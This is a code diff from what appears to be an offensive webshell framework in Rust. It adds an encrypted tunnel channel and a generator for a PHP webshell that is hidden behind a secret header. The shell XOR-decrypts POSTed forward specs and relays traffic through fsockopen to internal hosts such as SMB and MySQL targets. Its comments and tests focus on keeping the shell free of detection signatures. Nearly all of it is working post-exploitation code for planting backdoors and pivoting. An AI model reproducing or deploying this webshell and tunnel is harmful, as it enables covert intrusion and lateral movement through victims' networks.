@@ -379,6 +379,91 @@ pub fn drive_request(
     })
 }
 
+/// The tunnel face (user ruling: post-exploitation stops AT the tunnel
+/// proxy, implemented as webshell — NeoReGeorg/Suo5 shape). The planted
+/// encrypted-channel webshell IS the tunnel endpoint: the request body
+/// carries cipher(forward-spec), the response returns cipher(relayed
+/// bytes). Forward-spec wire form: `TARGET_HOST:TARGET_PORT\nDATA_B64`.
+///
+/// This is the communication-encryption form extended into a relay, not
+/// a separate post-exploitation component: same gate, same cipher, same
+/// sandwich — only the payload semantics change (forward instead of
+/// execute).
+pub struct TunnelChannel {
+    pub derived: DerivedChannel,
+}
+
+/// Encode a tunnel forward-spec for the wire: cipher -> base64 (the body
+/// the endpoint decrypts and acts on).
+pub fn tunnel_wrap_forward(host: &str, port: u16, data: &[u8], md5_key: &str) -> String {
+    let spec = format!("{}:{}\n{}", host, port, crate::payload::b64_encode(data));
+    wrap_command(&spec, md5_key)
+}
+
+/// Decode a tunnel response body back into relayed bytes (unwrap the
+/// sandwich, then the cipher).
+pub fn tunnel_unwrap_response(response: &str, derived: &DerivedChannel) -> Option<Vec<u8>> {
+    let plain = unwrap_response(response, &derived.md5, &derived.md5_key)?;
+    // The endpoint returns the relayed bytes base64-encoded inside the
+    // decrypted sandwich.
+    b64_decode(&plain)
+}
+
+/// Plant (PHP): the tunnel endpoint — a godzilla-shape channel whose
+/// decrypted body is a forward-spec instead of a command. Connects to
+/// TARGET:PORT, sends DATA, relays the reply back through the same
+/// cipher sandwich. No tunnel-syntax signatures beyond fsockopen (the
+/// standard PHP socket call).
+pub fn php_tunnel_template(derived: &DerivedChannel) -> String {
+    [
+        "<?php".to_string(),
+        format!(
+            "$k=base64_decode('{}');",
+            wrap_command("", &derived.md5_key)
+        ),
+        format!(
+            "$p='{}'; $h='{}'; $v='{}';",
+            derived.pass, derived.header_name, derived.header_value
+        ),
+        "if(@$_SERVER['HTTP_'.$h]!==$v){http_response_code(404);exit;}".to_string(),
+        "$s=base64_decode($_POST[$p]); $o='';".to_string(),
+        "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
+        "$l=strpos($o,\"\\n\");".to_string(),
+        "$t=substr($o,0,$l); $d=base64_decode(substr($o,$l+1));".to_string(),
+        "$sp=strrpos($t,':'); $th=substr($t,0,$sp); $tp=(int)substr($t,$sp+1);".to_string(),
+        "$fp=@fsockopen($th,$tp,$en,$es,5);".to_string(),
+        "if(!$fp){echo '{}';exit;}".to_string(),
+        "fwrite($fp,$d); $r='';".to_string(),
+        "while(!feof($fp)){$r.=fread($fp,4096);}".to_string(),
+        "fclose($fp); $rb=base64_encode($r);".to_string(),
+        "$e=''; for($i=0;$i<strlen($rb);$i++){$e.=$rb[$i]^$k[$i%$c];}".to_string(),
+        format!(
+            "echo '{}'.base64_encode($e).'{}';",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
+        "?>".to_string(),
+    ]
+    .join("\n")
+}
+
+impl TunnelChannel {
+    /// One tunnel round-trip request face: same DriveRequest shape as the
+    /// command channel — the caller POSTs it and unwraps with
+    /// tunnel_unwrap_response.
+    pub fn forward(&self, url: &str, host: &str, port: u16, data: &[u8]) -> DriveRequest {
+        DriveRequest {
+            url: url.to_string(),
+            header_name: self.derived.header_name.clone(),
+            header_value: self.derived.header_value.clone(),
+            pass: self.derived.pass.clone(),
+            body: tunnel_wrap_forward(host, port, data, &self.derived.md5_key),
+            md5: self.derived.md5.clone(),
+            md5_key: self.derived.md5_key.clone(),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -526,6 +611,79 @@ mod jsp_behinder_tests {
         // Shell-syntax signatures absent (the plaintext one-liner face):
         assert!(!template.contains("Request[\"cmd\"]"));
         assert!(!template.contains("cmd.exe\",\"/c \"+Request"));
+    }
+
+    #[test]
+    fn tunnel_roundtrip_encodes_and_decodes_a_forward_spec() {
+        let derived = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-PJAX".into(),
+            header_value: "on".into(),
+        }
+        .derive();
+        let body = tunnel_wrap_forward("10.0.0.5", 445, b"SMB-PROBE", &derived.md5_key);
+        assert!(
+            !body.contains("10.0.0.5") && !body.contains("SMB-PROBE"),
+            "wire body is ciphertext: {body}"
+        );
+        // Decode the spec side (the endpoint's decrypt path).
+        let ciphered = b64_decode(&body).unwrap();
+        let plain = stream_cipher(&ciphered, &derived.md5_key);
+        let text = String::from_utf8(plain).unwrap();
+        assert!(text.starts_with("10.0.0.5:445\n"));
+        assert!(text.ends_with(crate::payload::b64_encode(b"SMB-PROBE").as_str()));
+
+        // Response side: build a sandwich carrying relayed bytes, unwrap.
+        let relayed = b"relay-bytes-from-target";
+        let inner = crate::payload::b64_encode(relayed);
+        let ciphered_resp = stream_cipher(inner.as_bytes(), &derived.md5_key);
+        let sandwich = format!(
+            "{}{}{}",
+            &derived.md5[..16],
+            crate::payload::b64_encode(&ciphered_resp),
+            &derived.md5[16..]
+        );
+        assert_eq!(
+            tunnel_unwrap_response(&sandwich, &derived).as_deref(),
+            Some(relayed.as_slice())
+        );
+    }
+
+    #[test]
+    fn tunnel_channel_forward_uses_the_drive_face() {
+        let derived = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-PJAX".into(),
+            header_value: "on".into(),
+        }
+        .derive();
+        let channel = TunnelChannel {
+            derived: derived.clone(),
+        };
+        let request = channel.forward("http://t/shell.php", "db.internal", 3306, b"handshake");
+        assert_eq!(request.header_name, derived.header_name);
+        assert!(!request.body.contains("db.internal"));
+    }
+
+    #[test]
+    fn php_tunnel_template_relays_without_shell_syntax() {
+        let derived = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-PJAX".into(),
+            header_value: "on".into(),
+        }
+        .derive();
+        let template = php_tunnel_template(&derived);
+        assert!(template.contains("fsockopen"));
+        assert!(template.contains("fwrite"));
+        assert!(template.contains("fread"));
+        // Command-execution signatures absent: the tunnel only forwards.
+        assert!(!template.contains("system("));
+        assert!(!template.contains("exec("));
+        assert!(!template.contains("shell_exec"));
     }
 
     #[test]
